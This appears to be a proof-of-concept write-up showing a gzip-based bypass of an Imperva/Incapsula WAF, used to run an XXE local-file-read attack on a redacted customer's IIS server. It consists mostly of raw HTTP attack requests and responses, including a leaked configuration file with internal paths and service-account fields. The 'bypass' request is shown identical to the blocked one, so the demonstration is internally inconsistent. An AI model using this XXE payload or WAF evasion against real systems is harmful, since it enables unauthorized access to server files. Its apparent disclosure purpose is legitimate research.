# Demo of the bypass being used to exploit a real customer
Please note the name of the customer has been redacted. In this example we're doing LFI via XXE.

## Without the WAF bypass
First make a request for XXE without using the WAF bypass:

```
POST /HTTPIntNet.aspx HTTP/2
Host: images.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Cookie: visid_incap_2601068=xxxxx;  incap_ses_1211_2601068=yyyyy
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
Content-Length: 216
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Referer: https://images.example.com/foo.aspx
Origin: https://images.example.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE foo 
[<!ENTITY xxe SYSTEM "file:///C:/Program Files (x86)/redacted/Common Files/redacted.ini">
]>
<FUNCTION>
<NAME>&xxe;</NAME>
</FUNCTION>
```

Response:
```
HTTP/2 403 Forbidden
Content-Type: text/html
Cache-Control: no-cache, no-store
Content-Length: 866
X-Iinfo: 7-41000613-0 PNNN RT(1639592547810 0) q(0 0 0 0) r(0 -1) B15(3,501529,0) U6
Set-Cookie: incap_ses_1211_2601068=KVPoEbP3dDJg3ktCjFbOEGMyumEAAAAABlII4w2xe7Qi4FUmmOjRCA==; path=/; Domain=.bftg.com
<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3"></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=7-41000613-0%20PNNN%20RT%281639592547810%200%29%20q%280%200%200%200%29%20r%280%20-1%29%20B15%283%2c501529%2c0%29%20U6&incident_id=1211000510216920672-176505529399184583&edet=15&cinfo=03000000c67f&rpinfo=0&mth=POST" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 1211000510216920672-176505529399184583</iframe></body></html>
```

## With the WAF bypass
Here's the same XXE request, but using the gzip exploit:
```
POST /HTTPIntNet.aspx HTTP/2
Host: images.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Cookie: visid_incap_2601068=xxxxx;  incap_ses_1211_2601068=yyyyy
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
Content-Length: 216
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Referer: https://images.example.com/foo.aspx
Origin: https://images.example.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE foo 
[<!ENTITY xxe SYSTEM "file:///C:/Program Files (x86)/redacted/Common Files/redacted.ini">
]>
<FUNCTION>
<NAME>&xxe;</NAME>
</FUNCTION>
```

The XXE payload gets passed by the WAF to the backend server where the XXE payload is triggered, returning the content of the LFI file we requested:
```
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/8.5
X-Aspnet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 15 Dec 2021 18:25:06 GMT
Set-Cookie: redacted=redacted; path=/; Httponly; Secure
Vary: Accept-Encoding
Set-Cookie: incap_ses_1211_2601068=xxxx=; path=/; Domain=.example.com
X-Cdn: Imperva
X-Iinfo: 13-108070049-108070050 NNYN CT(26 25 0) RT(1639592714064 0) q(0 0 1 0) r(1 1) U6
There is no function named [PxxM-GxxxxxSYSTEM]
CACHEPATH=C:\PROGRAM FILES (X86)\redacted\COMMON FILES\CACHE
CACHEURL=HTTPS://172.n.n.15/CACHE/
[redacted]
REDIRECTREQ=HTTP://Mxxxxxxxx3.example.COM
LASTUSEDPATHCACHE=C:\PROGRAM FILES (X86)\redacted\COMMON FILES\CACHE
[PxxxxxxxxSVC]
SERVICEACCOUNT=
SERVICEPWD=
.
```

The gzip bypass exploit is what made this attack possible. Note that not all webservers will process the request correctly because of the gzip/plain text mismatch, but IIS, Apache, NGINX all appear to work just fine.
